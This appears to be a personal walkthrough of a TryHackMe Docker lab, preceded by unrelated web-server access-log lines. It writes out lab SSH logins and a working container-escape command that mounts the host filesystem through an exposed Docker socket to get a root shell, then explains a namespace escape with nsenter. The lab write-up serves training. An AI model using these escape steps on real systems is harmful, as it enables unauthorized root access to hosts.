GET /stylesheets/lib/ladda-themeless.min.css 304 1.593 ms - -
GET /stylesheets/lib/ie10-viewport-bug-workaround.css 304 1.476 ms - -
GET /stylesheets/blockchain.css 304 5.736 ms - -
GET /javascripts/lib/jquery.min.js 304 3.332 ms - -
GET /javascripts/lib/bootstrap.min.js 304 6.782 ms - -
GET /javascripts/lib/ladda.min.js 304 1.577 ms - -
GET /javascripts/lib/ie10-viewport-bug-workaround.js 304 6.861 ms - -
GET /javascripts/lib/spin.min.js 304 2.847 ms - -
GET /javascripts/blockchain.js 304 3.428 ms - -
GET /javascripts/lib/sha256.js 304 2.721 ms - -
GET /distributed 200 848.533 ms - 27508
GET /stylesheets/lib/bootstrap.min.css 304 5.491 ms - -
GET /stylesheets/lib/bootstrap-theme.min.css 304 2.360 ms - -
GET /stylesheets/lib/bootstrap-horizon.css 304 2.806 ms - -
GET /stylesheets/lib/ladda-themeless.min.css 304 1.417 ms - -
GET /stylesheets/lib/ie10-viewport-bug-workaround.css 304 2.627 ms - -
GET /stylesheets/blockchain.css 304 4.450 ms - -
GET /javascripts/lib/jquery.min.js 304 7.820 ms - -
GET /javascripts/lib/spin.min.js 304 7.816 ms - -
GET /javascripts/lib/ladda.min.js 304 6.474 ms - -
GET /javascripts/lib/bootstrap.min.js 304 7.204 ms - -
GET /javascripts/lib/ie10-viewport-bug-workaround.js 304 5.896 ms - -
GET /javascripts/lib/sha256.js 304 2.793 ms - -
GET /javascripts/blockchain.js 304 2.806 ms - -
GET /distributed 304 365.796 ms - -
GET /stylesheets/lib/bootstrap.min.css 304 10.354 ms - -
GET /stylesheets/lib/bootstrap-theme.min.css 304 6.200 ms - -
GET /stylesheets/lib/ladda-themeless.min.css 304 3.662 ms - -
GET /stylesheets/lib/bootstrap-horizon.css 304 3.920 ms - -
GET /stylesheets/lib/ie10-viewport-bug-workaround.css 304 4.475 ms - -
GET /stylesheets/blockchain.css 304 2.813 ms - -
GET /javascripts/lib/jquery.min.js 304 17.877 ms - -
GET /javascripts/lib/bootstrap.min.js 304 19.374 ms - -
GET /javascripts/lib/spin.min.js 304 16.683 ms - -
GET /javascripts/lib/ladda.min.js 304 13.225 ms - -
GET /javascripts/lib/ie10-viewport-bug-workaround.js 304 11.473 ms - -
GET /javascripts/lib/sha256.js 304 5.380 ms - -
GET /javascripts/blockchain.js 304 1.242 ms - -
GET /distributed 304 382.451 ms - -
GET /stylesheets/lib/bootstrap.min.css 304 4.043 ms - -
GET /stylesheets/lib/bootstrap-theme.min.css 304 1.725 ms - -
GET /stylesheets/lib/bootstrap-horizon.css 304 1.165 ms - -
GET /stylesheets/lib/ladda-themeless.min.css 304 0.735 ms - -
GET /stylesheets/lib/ie10-viewport-bug-workaround.css 304 1.323 ms - -
GET /stylesheets/blockchain.css 304 1.003 ms - -
GET /javascripts/lib/jquery.min.js 304 0.836 ms - -
GET /javascripts/lib/bootstrap.min.js 304 2.111 ms - -
GET /javascripts/lib/spin.min.js 304 2.083 ms - -
GET /javascripts/lib/ladda.min.js 304 0.919 ms - -
GET /javascripts/lib/ie10-viewport-bug-workaround.js 304 1.577 ms - -
GET /javascripts/lib/sha256.js 304 2.220 ms - -
GET /javascripts/blockchain.js 304 0.669 ms - -
GET /tokens 200 413.020 ms - 53743
GET /stylesheets/lib/bootstrap.min.css 304 0.715 ms - -
GET /stylesheets/lib/bootstrap-theme.min.css 304 1.031 ms - -
GET /stylesheets/lib/bootstrap-horizon.css 304 2.599 ms - -
GET /stylesheets/lib/ladda-themeless.min.css 304 2.084 ms - -
GET /stylesheets/lib/ie10-viewport-bug-workaround.css 304 2.705 ms - -
GET /stylesheets/blockchain.css 304 1.711 ms - -
GET /javascripts/lib/jquery.min.js 304 1.190 ms - -
GET /javascripts/lib/bootstrap.min.js 304 2.365 ms - -
GET /javascripts/lib/spin.min.js 304 2.235 ms - -
GET /javascripts/lib/ladda.min.js 304 1.738 ms - -
GET /javascripts/lib/sha256.js 304 2.029 ms - -
GET /javascripts/blockchain.js 304 4.242 ms - -
GET /javascripts/lib/ie10-viewport-bug-workaround.js 200 13.119 ms - 641
GET /coinbase 200 448.748 ms - 49151
GET /stylesheets/lib/bootstrap.min.css 304 1.123 ms - -
GET /stylesheets/lib/bootstrap-theme.min.css 304 1.753 ms - -
GET /stylesheets/lib/bootstrap-horizon.css 304 2.544 ms - -
GET /stylesheets/lib/ladda-themeless.min.css 304 2.071 ms - -
GET /stylesheets/lib/ie10-viewport-bug-workaround.css 304 2.324 ms - -
GET /stylesheets/blockchain.css 304 3.851 ms - -
GET /javascripts/lib/jquery.min.js 304 5.819 ms - -
GET /javascripts/lib/bootstrap.min.js 304 1.054 ms - -
GET /javascripts/lib/spin.min.js 304 1.142 ms - -
GET /javascripts/lib/ladda.min.js 304 2.083 ms - -
GET /javascripts/lib/ie10-viewport-bug-workaround.js 304 1.075 ms - -
GET /javascripts/lib/sha256.js 304 1.301 ms - -
GET /javascripts/blockchain.js 304 1.523 ms - -
GET /blockchain 304 220.480 ms - -
GET /stylesheets/lib/bootstrap.min.css 304 1.016 ms - -
GET /stylesheets/lib/bootstrap-theme.min.css 304 3.281 ms - -
GET /stylesheets/lib/bootstrap-horizon.css 304 2.697 ms - -
GET /stylesheets/lib/ladda-themeless.min.css 304 2.167 ms - -
GET /stylesheets/lib/ie10-viewport-bug-workaround.css 304 0.984 ms - -
GET /stylesheets/blockchain.css 304 0.909 ms - -
GET /javascripts/lib/jquery.min.js 304 0.933 ms - -
GET /javascripts/lib/bootstrap.min.js 304 1.201 ms - -
GET /javascripts/lib/spin.min.js 304 0.993 ms - -
GET /javascripts/lib/ladda.min.js 304 4.176 ms - -
GET /javascripts/lib/ie10-viewport-bug-workaround.js 304 1.961 ms - -
GET /javascripts/lib/sha256.js 304 0.930 ms - -
GET /javascripts/blockchain.js 304 1.486 ms - -
GET /block 304 119.234 ms - -
GET /stylesheets/lib/bootstrap.min.css 304 2.872 ms - -
GET /stylesheets/lib/bootstrap-theme.min.css 304 2.250 ms - -
GET /stylesheets/lib/bootstrap-horizon.css 304 8.055 ms - -
GET /stylesheets/lib/ladda-themeless.min.css 304 7.943 ms - -
GET /stylesheets/lib/ie10-viewport-bug-workaround.css 304 3.480 ms - -
GET /stylesheets/blockchain.css 304 1.520 ms - -
GET /javascripts/lib/jquery.min.js 304 3.036 ms - -
GET /javascripts/lib/spin.min.js 304 2.421 ms - -
GET /javascripts/lib/ladda.min.js 304 1.834 ms - -
GET /javascripts/lib/ie10-viewport-bug-workaround.js 304 2.287 ms - -
GET /javascripts/lib/sha256.js 304 2.246 ms - -
GET /javascripts/lib/bootstrap.min.js 304 2.837 ms - -
GET /javascripts/blockchain.js 304 2.338 ms - -
GET /hash 304 49.669 ms - -
GET /stylesheets/lib/bootstrap.min.css 304 1.240 ms - -
GET /stylesheets/lib/bootstrap-theme.min.css 304 0.823 ms - -
GET /stylesheets/lib/bootstrap-horizon.css 304 0.881 ms - -
GET /stylesheets/lib/ladda-themeless.min.css 304 0.894 ms - -
GET /stylesheets/lib/ie10-viewport-bug-workaround.css 304 6.935 ms - -
GET /stylesheets/blockchain.css 304 5.458 ms - -
GET /javascripts/lib/jquery.min.js 304 6.791 ms - -
GET /javascripts/lib/bootstrap.min.js 304 7.420 ms - -
GET /javascripts/lib/spin.min.js 304 7.631 ms - -
GET /javascripts/lib/ladda.min.js 304 3.209 ms - -
GET /javascripts/lib/ie10-viewport-bug-workaround.js 304 3.136 ms - -
GET /javascripts/lib/sha256.js 304 3.212 ms - -
GET /javascripts/blockchain.js 304 3.287 ms - -
GET / 200 50.410 ms - 2474
GET /stylesheets/lib/bootstrap.min.css 304 1.392 ms - -
GET /stylesheets/lib/bootstrap-theme.min.css 304 2.011 ms - -
GET /stylesheets/lib/bootstrap-horizon.css 304 1.861 ms - -
GET /stylesheets/lib/ladda-themeless.min.css 304 2.160 ms - -
GET /stylesheets/lib/ie10-viewport-bug-workaround.css 304 2.121 ms - -
GET /stylesheets/blockchain.css 304 1.357 ms - -
GET /javascripts/lib/jquery.min.js 304 3.289 ms - -
GET /javascripts/lib/bootstrap.min.js 304 3.786 ms - -
GET /javascripts/lib/spin.min.js 304 1.903 ms - -
GET /javascripts/lib/ladda.min.js 304 2.046 ms - -
GET /javascripts/lib/ie10-viewport-bug-workaround.js 304 1.227 ms - -
GET /javascripts/lib/sha256.js 304 1.440 ms - -
GET /javascripts/blockchain.js 304 1.387 ms - -
GET /images/fork-me-on-github-ribbon.png 200 4.360 ms - 8146
GET / 304 1448.053 ms - -
GET /stylesheets/lib/bootstrap.min.css 304 28.535 ms - -
GET /javascripts/lib/jquery.min.js 304 50.546 ms - -
GET /stylesheets/lib/ie10-viewport-bug-workaround.css 304 44.403 ms - -
GET /stylesheets/lib/bootstrap-horizon.css 304 72.617 ms - -
GET /stylesheets/lib/ladda-themeless.min.css 304 70.622 ms - -
GET /stylesheets/lib/bootstrap-theme.min.css 304 63.469 ms - -
GET /stylesheets/blockchain.css 200 104.025 ms - 586
GET /javascripts/lib/bootstrap.min.js 304 7.513 ms - -
GET /javascripts/lib/spin.min.js 304 15.277 ms - -
GET /javascripts/lib/ladda.min.js 304 8.149 ms - -
GET /javascripts/lib/ie10-viewport-bug-workaround.js 304 29.125 ms - -
GET /javascripts/lib/sha256.js 304 30.632 ms - -
GET /javascripts/blockchain.js 304 1.764 ms - -
GET /images/fork-me-on-github-ribbon.png 200 13.410 ms - 8146
GET /blockchain 304 317.399 ms - -
GET /stylesheets/lib/bootstrap.min.css 304 1.283 ms - -
GET /stylesheets/lib/bootstrap-theme.min.css 304 1.443 ms - -
GET /stylesheets/lib/bootstrap-horizon.css 304 8.382 ms - -
GET /stylesheets/lib/ie10-viewport-bug-workaround.css 304 6.311 ms - -
GET /stylesheets/lib/ladda-themeless.min.css 304 3.221 ms - -
GET /javascripts/lib/ladda.min.js 304 4.277 ms - -
GET /javascripts/lib/spin.min.js 304 6.174 ms - -
GET /javascripts/lib/sha256.js 304 3.328 ms - -
GET /javascripts/lib/ie10-viewport-bug-workaround.js 304 8.634 ms - -
GET /stylesheets/blockchain.css 304 10.765 ms - -
GET /javascripts/lib/bootstrap.min.js 304 9.286 ms - -
GET /javascripts/lib/jquery.min.js 304 8.127 ms - -
GET /javascripts/blockchain.js 304 32.889 ms - -
GET /distributed 200 336.766 ms - 27508
GET /stylesheets/lib/bootstrap.min.css 304 2.350 ms - -
GET /stylesheets/lib/bootstrap-theme.min.css 304 2.490 ms - -
GET /stylesheets/lib/bootstrap-horizon.css 304 3.811 ms - -
GET /stylesheets/lib/ladda-themeless.min.css 304 3.869 ms - -
GET /stylesheets/lib/ie10-viewport-bug-workaround.css 304 4.820 ms - -
GET /stylesheets/blockchain.css 304 0.741 ms - -
GET /javascripts/lib/jquery.min.js 304 2.096 ms - -
GET /javascripts/lib/bootstrap.min.js 304 2.530 ms - -
GET /javascripts/lib/spin.min.js 304 6.548 ms - -
GET /javascripts/lib/ladda.min.js 304 6.321 ms - -
GET /javascripts/lib/ie10-viewport-bug-workaround.js 304 7.152 ms - -
GET /javascripts/blockchain.js 304 5.951 ms - -
GET /javascripts/lib/sha256.js 304 4.411 ms - -
GET /coinbase 304 500.725 ms - -
GET /stylesheets/lib/bootstrap.min.css 304 1.610 ms - -
GET /stylesheets/lib/bootstrap-theme.min.css 304 1.242 ms - -
GET /stylesheets/lib/bootstrap-horizon.css 304 1.543 ms - -
GET /stylesheets/lib/ladda-themeless.min.css 304 2.250 ms - -
GET /stylesheets/lib/ie10-viewport-bug-workaround.css 304 1.204 ms - -
GET /stylesheets/blockchain.css 304 1.279 ms - -
GET /javascripts/lib/jquery.min.js 304 2.518 ms - -
GET /javascripts/lib/bootstrap.min.js 304 1.337 ms - -
GET /javascripts/lib/spin.min.js 304 1.090 ms - -
GET /javascripts/lib/ladda.min.js 304 2.136 ms - -
GET /javascripts/lib/ie10-viewport-bug-workaround.js 304 2.336 ms - -
GET /javascripts/lib/sha256.js 304 1.682 ms - -
GET /javascripts/blockchain.js 304 1.270 ms - -
```
https://fosterelli.co/privilege-escalation-via-docker
For this task, we're going to assume that we have managed to gain a foothold onto the container from something such as a vulnerable website running in a container.
7.1. Step 1. Connecting to the container:
Connect to your Instance using SSH with the following details:
IP: 10.10.153.100
SSH Port: 2233
Username: danny
Password: danny
7.2. Looking for the exposed Docker socket
Armed with the knowledge we've learnt about the Docker socket in "Vulnerability #4: RCE via Exposed Docker Daemon", we can look for exposure of this file within the container, and confirm whether or not the current user has permissions to run docker commands with groups.
![](https://assets.tryhackme.com/additional/docker-rodeo/container-socket/container-sock1.png)
```text
┌──(kali㉿kali)-[~/docker_rodeo]
└─$ ssh danny@10.10.153.100 -p 2233 
The authenticity of host '[10.10.153.100]:2233 ([10.10.153.100]:2233)' can't be established.
ED25519 key fingerprint is SHA256:tBURDFD5bEwHNEuZrgMUboxGjjoQ3LwsXgHGAAnWMe0.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.153.100]:2233' (ED25519) to the list of known hosts.
danny@10.10.153.100's password: 
danny@3d8fe1db6635:~$ whoami
danny
danny@3d8fe1db6635:~$ groups
danny docker
danny@3d8fe1db6635:~$ cd /var/run
danny@3d8fe1db6635:/var/run$ ls -la | grep sock
srw-rw---- 1 root docker    0 Oct 26 00:42 docker.sock
```
7.3. Mount host volumes
In the instance of this room, I have already downloaded the "alpine" image to the container that you are exploiting. In a THM room, you will most likely have to upload this image to the container before you can execute it, as Instances do not deploy with an internet connection.
Now that we've confirmed we can execute Docker commands, let's mount the host directory to a new container and then connect to that to reveal all the data on the host OS! docker run -v /:/mnt --rm -it alpine chroot /mnt sh
![](https://assets.tryhackme.com/additional/docker-rodeo/container-socket/container-sock2.png)
Note: If you do not receive any output after 30 seconds you will need to cancel the command by "Ctrl + C" and attempt to run it again.
We are essentially mounting the hosts "/" directory to the "/mnt" dir in a new container, chrooting and then connecting via a shell.
7.4. Verify loot
Success! We have a shell, let's verify who we're now connected as and enumerate around the file system.
![](https://assets.tryhackme.com/additional/docker-rodeo/container-socket/container-sock3.png)
```text
danny@3d8fe1db6635:/var/run$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
```text
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
```
```text
# ls /
bin    dev   initrd.img      lib64       mnt   root  snap      sys  var
boot   etc   initrd.img.old  lost+found  opt   run   srv       tmp  vmlinuz
cdrom  home  lib             media       proc  sbin  swap.img  usr  vmlinuz.old
```
```text
# groups
root daemon bin sys adm disk uucp groups: cannot find name for group ID 11
11 dialout tape sudo
```
```text
# cd root
```
```text
# ls
```
```text
# ls -lah
total 28K
drwx------  4 root root 4.0K Nov 10  2020 .
drwxr-xr-x 24 root root 4.0K Nov 12  2020 ..
-rw-------  1 root root  406 Nov 13  2020 .bash_history
-rw-r--r--  1 root root 3.1K Apr  9  2018 .bashrc
drwxr-xr-x  3 root root 4.0K Oct 24  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4.0K Nov 12  2020 .ssh
```
```text
# cat authorized_keys
```
```text
# cat known_hosts
|1|/EHt5UUsnI9hqwcLMFA5TdvNtrs=|qihaDMUpcVI9fwvdha7PesRjel4= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOZqllWCjU44z6Ho/Klb55xcniFu7VomYL0mtptJjIIJMH+XeCJ7USG+BWA/OM6qfSkOpmHRqQyWmq5tukju+2s=

:)

Escape Successful
```
8.1. Let's backpedal a little bit...
I purposefully waited until this stage to show you exactly how Docker "isolates" containers from one another. Let's bring back our trusty diagram that demonstrates how containers run on the operating system.
![](https://assets.tryhackme.com/additional/docker-rodeo/namespaces/docker-containers.png)
```text
3d8fe1db6635   container-socket       "/usr/sbin/sshd -D"      23 months ago   Up 10 minutes   0.0.0.0:2233->22/tcp     brave_mendel 

yep could connect thorugh ssh cz is open in port 2233
```
As you would have discovered during this room,  containers have networking capabilities and their own file storage...I mean we have previously used SSH to connect to the container into them and there were files present! They achieve this by using three components of the Linux kernel:
Namespaces
Cgroups
OverlayFS
But we're only going to be interested in namespaces here, after all, they lay at the heart of it. Namespaces essentially segregate system resources such as processes, files and memory away from other namespaces.
Every process running on Linux will be assigned two things:
A namespace
A process identifier (PID)
Namespaces are how containerization is achieved! Processes can only "see" the process that is in the same namespace - no conflicts in theory. Take Docker for example, every new container will be running as a new namespace, although the container may be running multiple applications (and in turn, processes).
Let's prove the concept of containerisation by comparing the number of processes there are in a Docker container that is running a webserver versus host operating system at the time:
![](https://assets.tryhackme.com/additional/docker-rodeo/namespaces/ps1.png)
Note some useful information highlighted in red. On the very left we can see system user the process is running as then the processes number. There are a few more columns that aren't worth explaining for this task. But notice in the last column, the command that is running. I've highlighted a Docker command running, and an instance of Google Chrome running. You can see I have a considerable amount of processes running.
Let's list the processes running in our Docker container using ps aux It's important to note that we only have 6 processes running. This difference is a great indicator that we're in a container.
![](https://assets.tryhackme.com/additional/docker-rodeo/namespaces/ps2.png)
```text
# ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.4 159864  9096 ?        Ss   00:41   0:02 /sbin/init
root         2  0.0  0.0      0     0 ?        S    00:41   0:00 [kthreadd]
root         4  0.0  0.0      0     0 ?        I<   00:41   0:00 [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        I<   00:41   0:00 [mm_percpu_wq]
root         7  0.0  0.0      0     0 ?        S    00:41   0:00 [ksoftirqd/0]
root         8  0.0  0.0      0     0 ?        I    00:41   0:00 [rcu_sched]
root         9  0.0  0.0      0     0 ?        I    00:41   0:00 [rcu_bh]
root        10  0.0  0.0      0     0 ?        S    00:41   0:00 [migration/0]
root        11  0.0  0.0      0     0 ?        S    00:41   0:00 [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    00:41   0:00 [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    00:41   0:00 [cpuhp/1]
root        14  0.0  0.0      0     0 ?        S    00:41   0:00 [watchdog/1]
root        15  0.0  0.0      0     0 ?        S    00:41   0:00 [migration/1]
root        16  0.0  0.0      0     0 ?        S    00:41   0:00 [ksoftirqd/1]
root        17  0.0  0.0      0     0 ?        I    00:41   0:00 [kworker/1:0]
root        18  0.0  0.0      0     0 ?        I<   00:41   0:00 [kworker/1:0H]
root        19  0.0  0.0      0     0 ?        S    00:41   0:00 [kdevtmpfs]
root        20  0.0  0.0      0     0 ?        I<   00:41   0:00 [netns]
root        21  0.0  0.0      0     0 ?        S    00:41   0:00 [rcu_tasks_kthre]
root        22  0.0  0.0      0     0 ?        S    00:41   0:00 [kauditd]
root        24  0.0  0.0      0     0 ?        I    00:41   0:00 [kworker/0:1]
root        25  0.0  0.0      0     0 ?        S    00:41   0:00 [khungtaskd]
root        26  0.0  0.0      0     0 ?        S    00:41   0:00 [oom_reaper]
root        27  0.0  0.0      0     0 ?        I<   00:41   0:00 [writeback]
root        28  0.0  0.0      0     0 ?        S    00:41   0:00 [kcompactd0]
root        29  0.0  0.0      0     0 ?        SN   00:41   0:00 [ksmd]
root        30  0.0  0.0      0     0 ?        SN   00:41   0:00 [khugepaged]
root        31  0.0  0.0      0     0 ?        I<   00:41   0:00 [crypto]
root        32  0.0  0.0      0     0 ?        I<   00:41   0:00 [kintegrityd]
root        33  0.0  0.0      0     0 ?        I<   00:41   0:00 [kblockd]
root        34  0.0  0.0      0     0 ?        I<   00:41   0:00 [ata_sff]
root        35  0.0  0.0      0     0 ?        I<   00:41   0:00 [md]
root        36  0.0  0.0      0     0 ?        I<   00:41   0:00 [edac-poller]
root        37  0.0  0.0      0     0 ?        I<   00:41   0:00 [devfreq_wq]
root        38  0.0  0.0      0     0 ?        I<   00:41   0:00 [watchdogd]
root        41  0.0  0.0      0     0 ?        S    00:41   0:00 [kswapd0]
root        42  0.0  0.0      0     0 ?        I<   00:41   0:00 [kworker/u5:0]
root        43  0.0  0.0      0     0 ?        S    00:41   0:00 [ecryptfs-kthrea]
root        85  0.0  0.0      0     0 ?        I<   00:41   0:00 [kthrotld]
root        86  0.0  0.0      0     0 ?        I<   00:41   0:00 [acpi_thermal_pm]
root        90  0.0  0.0      0     0 ?        I<   00:41   0:00 [ipv6_addrconf]
root        99  0.0  0.0      0     0 ?        I<   00:41   0:00 [kstrp]
root       104  0.0  0.0      0     0 ?        I    00:41   0:00 [kworker/0:2]
root       117  0.0  0.0      0     0 ?        I<   00:41   0:00 [charger_manager]
root       155  0.0  0.0      0     0 ?        I<   00:41   0:00 [nvme-wq]
root       157  0.0  0.0      0     0 ?        I<   00:41   0:00 [ena]
root       183  0.0  0.0      0     0 ?        I    00:41   0:00 [kworker/u4:3]
root       222  0.0  0.0      0     0 ?        I<   00:41   0:00 [kdmflush]
root       224  0.0  0.0      0     0 ?        I<   00:41   0:00 [bioset]
root       300  0.0  0.0      0     0 ?        I<   00:41   0:00 [raid5wq]
root       353  0.0  0.0      0     0 ?        S    00:41   0:00 [jbd2/dm-0-8]
root       354  0.0  0.0      0     0 ?        I<   00:41   0:00 [ext4-rsv-conver]
root       387  0.0  0.0      0     0 ?        I<   00:41   0:00 [kworker/1:1H]
root       388  0.0  0.0      0     0 ?        I<   00:41   0:00 [kworker/0:1H]
root       430  0.0  0.8  94884 16964 ?        S<s  00:42   0:00 /lib/systemd/systemd
root       446  0.0  0.0      0     0 ?        I<   00:42   0:00 [iscsi_eh]
root       448  0.0  0.0      0     0 ?        I<   00:42   0:00 [ib-comp-wq]
root       449  0.0  0.0      0     0 ?        I<   00:42   0:00 [ib-comp-unb-wq]
root       450  0.0  0.0      0     0 ?        I<   00:42   0:00 [ib_mcast]
root       451  0.0  0.0      0     0 ?        I<   00:42   0:00 [ib_nl_sa_wq]
root       452  0.0  0.0      0     0 ?        I<   00:42   0:00 [rdma_cm]
root       453  0.0  0.0 105904  1764 ?        Ss   00:42   0:00 /sbin/lvmetad -f
root       459  0.0  0.2  46748  5580 ?        Ss   00:42   0:01 /lib/systemd/systemd
root       462  0.0  0.0      0     0 ?        S<   00:42   0:00 [loop0]
root       463  0.0  0.0      0     0 ?        S<   00:42   0:00 [loop1]
root       631  0.0  0.0      0     0 ?        S    00:42   0:00 [jbd2/nvme1n1p2-]
root       632  0.0  0.0      0     0 ?        I<   00:42   0:00 [ext4-rsv-conver]
62583      746  0.0  0.1 141960  3248 ?        Ssl  00:42   0:00 /lib/systemd/systemd
systemd+   881  0.0  0.2  80204  5396 ?        Ss   00:42   0:00 /lib/systemd/systemd
systemd+   922  0.0  0.3  70792  6208 ?        Ss   00:42   0:00 /lib/systemd/systemd
daemon    1019  0.0  0.1  28332  2464 ?        Ss   00:42   0:00 /usr/sbin/atd -f
syslog    1021  0.0  0.2 263036  4424 ?        Ssl  00:42   0:00 /usr/sbin/rsyslogd -
root      1027  0.0  0.0 161076  1548 ?        Ssl  00:42   0:00 /usr/bin/lxcfs /var/
root      1032  0.0  0.3 286452  6780 ?        Ssl  00:42   0:00 /usr/lib/accountsser
root      1033  0.0  0.2  62156  5768 ?        Ss   00:42   0:00 /lib/systemd/systemd
message+  1036  0.0  0.2  50104  4328 ?        Ss   00:42   0:00 /usr/bin/dbus-daemon
root      1096  0.0  1.3 876020 26896 ?        Ssl  00:42   0:00 /usr/bin/amazon-ssm-
root      1097  0.0  0.8 169192 17104 ?        Ssl  00:42   0:00 /usr/bin/python3 /us
root      1105  0.0  0.1  30104  3204 ?        Ss   00:42   0:00 /usr/sbin/cron -f
root      1111  0.0  1.3 931740 27984 ?        Ssl  00:42   0:01 /usr/lib/snapd/snapd
root      1114  0.0  0.1 110416  2056 ?        Ssl  00:42   0:00 /usr/sbin/irqbalance
root      1119  0.1  2.4 1288996 49196 ?       Ssl  00:42   0:04 /usr/bin/containerd
root      1122  0.0  0.9 186032 19924 ?        Ssl  00:42   0:00 /usr/bin/python3 /us
root      1132  0.0  0.1  14768  2320 ttyS0    Ss+  00:42   0:00 /sbin/agetty -o -p -
root      1134  0.0  0.3 291448  7096 ?        Ssl  00:42   0:00 /usr/lib/policykit-1
root      1143  0.0  0.1  13244  2020 tty1     Ss+  00:42   0:00 /sbin/agetty -o -p -
root      1205  0.0  0.3  72304  6428 ?        Ss   00:42   0:00 /usr/sbin/sshd -D
root      1423  0.0  4.2 1401928 85740 ?       Ssl  00:42   0:01 /usr/bin/dockerd -H 
root      1684  0.0  0.1 479372  3932 ?        Sl   00:42   0:00 /usr/bin/docker-prox
root      1704  0.0  0.2 553104  4048 ?        Sl   00:42   0:00 /usr/bin/docker-prox
root      1717  0.0  0.1 407048  3904 ?        Sl   00:42   0:00 /usr/bin/docker-prox
root      1723  0.0  0.2 108724  5532 ?        Sl   00:42   0:00 containerd-shim -nam
root      1724  0.0  0.2 108724  5628 ?        Sl   00:42   0:00 containerd-shim -nam
root      1728  0.0  0.3 108724  6360 ?        Sl   00:42   0:00 containerd-shim -nam
root      1734  0.0  0.1 626836  3988 ?        Sl   00:42   0:00 /usr/bin/docker-prox
root      1748  0.0  0.2 553104  4076 ?        Sl   00:42   0:00 /usr/bin/docker-prox
root      1767  0.0  0.3 110132  6116 ?        Sl   00:42   0:00 containerd-shim -nam
root      1772  0.0  0.2 108724  5052 ?        Sl   00:42   0:00 containerd-shim -nam
root      1847  0.0  0.3  72304  6068 ?        Ss   00:42   0:00 /usr/sbin/sshd -D
root      1853  0.0  0.3  72304  6184 ?        Ss   00:42   0:00 /usr/sbin/sshd -D
root      1875  0.0  0.3  72304  6320 ?        Ss   00:42   0:00 /usr/sbin/sshd -D
root      1881  0.0  0.7 122768 15760 ?        Ssl  00:42   0:00 registry serve /etc/
root      1894  0.0  0.8 122768 16616 ?        Ssl  00:42   0:00 registry serve /etc/
root      2516  0.0  0.0      0     0 ?        I    00:56   0:00 [kworker/1:1]
root      2540  0.0  0.3  72364  6572 ?        Ss   01:20   0:00 sshd: danny [priv]
cmnatic   2544  0.0  0.1  72364  3352 ?        S    01:20   0:00 sshd: danny@pts/0
cmnatic   2545  0.0  0.1  20256  3824 ?        Ss   01:20   0:00 -bash
cmnatic   2564  0.0  2.9 928904 58672 ?        Sl+  01:23   0:00 docker run -v /:/mnt
root      2583  0.0  0.3 108724  6056 ?        Sl   01:24   0:00 containerd-shim -nam
root      2607  0.0  0.0   4628  1740 ?        Ss   01:24   0:00 sh
root      2658  0.0  0.0      0     0 ?        I    01:24   0:00 [kworker/u4:0]
root      2666  0.0  0.0      0     0 ?        I    01:30   0:00 [kworker/u4:1]
root      2667  0.0  0.1  36700  3136 ?        R+   01:33   0:00 ps aux
```
```text
# exit

danny@3d8fe1db6635:/var/run$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.3  72304  6068 ?        Ss   00:42   0:00 /usr/sbin/sshd -D
root        26  0.0  0.3  72364  6572 ?        Ss   01:20   0:00 sshd: danny [priv]
danny       28  0.0  0.1  72364  3352 ?        S    01:20   0:00 sshd: danny@pts/0
danny       29  0.0  0.1  20256  3828 pts/0    Ss   01:20   0:00 -bash
danny       56  0.0  0.1  36152  3160 pts/0    R+   01:36   0:00 ps aux
```
8.2. Here's why it matters to us:
Put simply, the process with an ID of 0 is the process that is started when the system boots. Processes numbers increment and must be started by another process, so naturally, the next process ID will be #1. This process is the systems init , for example, the latest versions of Ubuntu use systemd. Any other process that runs will be controlled by systemd (process #1).
We can use process #1's namespace on an operating system to escalate our privileges. Whilst containers are designed to use these namespaces to isolate from another, they can instead, coincide with the host computers processes, rather than isolated from...this gives us a nice opportunity to escape!
8.3. Getting started
This vulnerability generally relies on having root permissions to the container already so that the container is exposed to namespaces on the host.
Connect to your Instance using SSH with the following details:
New Instance IP: 10.10.153.100
SSH Port: 2244
Username: root
Password: danny
8.4. Our exploit here is simple...
We can confirm that the container we're connected to in namespaces of the host by using ps aux. Remember how we were only expecting a couple of entries? Now we can see the whole systems process...
![](https://assets.tryhackme.com/additional/docker-rodeo/namespaces/esc1.png)
The exploit here is actually rather trivial, but I'll digress nonetheless. We'll be invoking the [nsenter](https://man7.org/linux/man-pages/man1/nsenter.1.html) command. To summarise, this command allows you to execute start processes and place them within the same namespace as another process.
```text
63b932f4d7d2   privileged-container   "/usr/sbin/sshd -D"      23 months ago   Up 10 minutes   0.0.0.0:2244->22/tcp     musing_stonebraker

now using port 2244
root:danny

──(kali㉿kali)-[~/docker_rodeo]
└─$ ssh root@10.10.153.100 -p 2244
The authenticity of host '[10.10.153.100]:2244 ([10.10.153.100]:2244)' can't be established.
ED25519 key fingerprint is SHA256:TnK/teTwHzNhvysYkFqLCeP+Lvo4wGOytn/TA6VbNK0.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.153.100]:2244' (ED25519) to the list of known hosts.
root@10.10.153.100's password: 
Last login: Fri Nov 13 00:05:56 2020 from 172.17.0.1
root@63b932f4d7d2:~# groups
root
root@63b932f4d7d2:~# ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.4 159864  9096 ?        Ss   00:41   0:02 /sbin/init
root         2  0.0  0.0      0     0 ?        S    00:41   0:00 [kthreadd]
root         4  0.0  0.0      0     0 ?        I<   00:41   0:00 [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        I<   00:41   0:00 [mm_percpu_wq]
root         7  0.0  0.0      0     0 ?        S    00:41   0:00 [ksoftirqd/0]
